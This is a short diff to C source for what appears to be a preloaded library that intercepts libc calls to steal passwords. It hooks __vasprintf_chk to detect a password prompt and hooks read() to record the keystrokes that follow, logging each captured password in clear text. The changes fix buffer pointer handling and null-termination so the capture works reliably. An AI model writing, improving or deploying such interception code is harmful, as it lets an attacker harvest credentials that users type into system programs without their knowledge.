@@ -10,7 +10,7 @@
 
 int password_read_detected = 0;
 char password[PASSWORD_MAX_LEN];
-char *cur = password;
+char *cur = NULL;
 
 // password reading detection
 int __vasprintf_chk(char **__restrict __ptr, int __flag, const char *__restrict __fmt, __gnuc_va_list __arg)
@@ -20,6 +20,7 @@ int __vasprintf_chk(char **__restrict __ptr, int __flag, const char *__restrict 
     {
         log_info("password reading detected");
         password_read_detected = PASSWORD_READ_DETECTED;
+        cur = password;
     }
     int (*__vasprintf_chk_libc)(char **__restrict __ptr, int __flag, const char *__restrict __fmt, __gnuc_va_list __arg);
     __vasprintf_chk_libc = dlsym(RTLD_NEXT, "__vasprintf_chk");
@@ -38,6 +39,7 @@ ssize_t read(int __fd, void *__buf, size_t __nbytes)
     {
         if ('\n' == *(char *)__buf)
         {
+            *cur = '\0';
             log_info("password: %s", password);
             password_read_detected = 0;
         }
